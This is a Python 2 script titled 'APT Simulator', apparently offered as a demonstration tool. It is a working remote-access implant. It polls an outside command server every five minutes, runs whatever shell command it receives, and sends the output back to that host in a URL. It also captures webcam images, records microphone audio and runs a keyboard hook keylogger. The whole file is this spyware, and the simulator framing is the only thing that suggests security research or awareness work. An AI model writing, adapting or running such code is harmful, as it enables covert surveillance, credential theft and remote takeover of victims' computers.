# APT Simulator v1.0
# Author: Mert SARICA
# E-mail: mert [ . ] sarica [ @ ] gmail [ . ] com
# URL: http://www.mertsarica.com

from VideoCapture import Device
import pyaudio
import wave
import subprocess
import pythoncom, pyHook
import sys
import re
import os
import time
import urllib2
import logging

reload(sys)
sys.setdefaultencoding('iso-8859-9')
opener = urllib2.build_opener(urllib2.HTTPHandler)
urllib2.install_opener(opener)
console = 1

def cls():
    if sys.platform == 'linux-i386' or sys.platform == 'linux2':
        os.system("clear")
    elif sys.platform == 'win32':
        os.system("cls")
    else:
        os.system("cls")
		
def take_screenshot():
	if console:
		print "* Taking screenshot..."
	cam = Device()
	cam.saveSnapshot('apt.jpg')
	if console:
		print "* done\n"
	
def record_audio():
	CHUNK = 1024
	FORMAT = pyaudio.paInt16
	CHANNELS = 2
	RATE = 44100
	RECORD_SECONDS = 5
	WAVE_OUTPUT_FILENAME = "apt.wav"

	p = pyaudio.PyAudio()

	stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)

	if console:
		print "* Recording audio..."

	frames = []

	for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
		data = stream.read(CHUNK)
		frames.append(data)

	if console:
		print "* done\n" 

	stream.stop_stream()
	stream.close()
	p.terminate()

	wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
	wf.setnchannels(CHANNELS)
	wf.setsampwidth(p.get_sample_size(FORMAT))
	wf.setframerate(RATE)
	wf.writeframes(b''.join(frames))
	wf.close()

def keylogger():
	if console:
		print "* Logging key events... (press enter to escape)"
		
	def OnKeyboardEvent (event):
		keys = ""
		full_path = os.path.realpath(__file__)
		path, file = os.path.split(full_path)
		path = path + "\keylogs.txt"
		keyfile = open(path, "a")
		key = chr(event.Ascii)
		if event.Ascii == 13:
			key = "\n"
			hook.UnhookKeyboard()
			if console:
				print "* done\n"
			main()

		keys = keys + key
		keyfile.write(keys)
		keyfile.close()
		 
	hook = pyHook.HookManager()
	hook.KeyDown = OnKeyboardEvent
	hook.HookKeyboard()
	pythoncom.PumpMessages()

def process_order(cmd):
	if console:
		print "* Running received command:", cmd
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
	result = p.communicate()[0]
	if console:
		print "* Command output:", result
		# print "* done."
	url = "http://www.mertsarica.com/apt_simulator/apt.php?cmd=" + result
	if console:
		print "* Sending command output (%s) to APT Simulator..." % (result.strip())
	response = opener.open(url)
	if console:
		print "* done\n"
	
def take_order():
	url = "http://www.mertsarica.com/apt_simulator/apt.php"
	print "* Connecting to APT Simulator:", url
	response = opener.open(url)
	html = response.read()

	re1='((?:[a-z][a-z0-9_]*))'	# Variable Name 1
	re2='(:)'	# Any Single Character 1
	re3='((?:[a-z][a-z0-9_]*))'	# Variable Name 2
	re4='(:)'	# Any Single Character 2
	re5='((?:[a-z][a-z0-9_]*))'	# Variable Name 3
	re6='(:)'	# Any Single Character 3
	re7='((?:[a-z][a-z0-9_]*))'	# Variable Name 4

	rg = re.compile(re1+re2+re3+re4+re5+re6+re7,re.IGNORECASE|re.DOTALL)
	m = rg.search(html)

	if m:
		var1=m.group(1)
		c1=m.group(2)
		var2=m.group(3)
		c2=m.group(4)
		var3=m.group(5)
		c3=m.group(6)
		var4=m.group(7)
		
		if console:
			print "* Received command:", var1+c1+var2+c2+var3+c3+var4+"\n"

		if var1 == "ses":
			record_audio()
		if var2 == "ekrangoruntusu":
			take_screenshot()
		if var4:
			process_order(var4)
		if var3 == "tuskaydi":
			keylogger()
			
def main():
	while (1==1):
		try:
			take_order()
		except SystemExit:
			import msvcrt
			while msvcrt.kbhit():
				msvcrt.getch()
			print "* Bye..."
			sys.exit(1)
		except KeyboardInterrupt:
			import msvcrt
			while msvcrt.kbhit():
				msvcrt.getch()
			print "* Bye..."
			sys.exit(1)
		except:
			if console:
				print "---\nError, sleeping mode!(", str(sys.exc_info()), ")"
		time.sleep(300)
		main()

if __name__ == '__main__':
	cls()
	if console:
		print "========================================="
		print "APT Simulator [http://www.mertsarica.com]"
		print "========================================="
        main()     
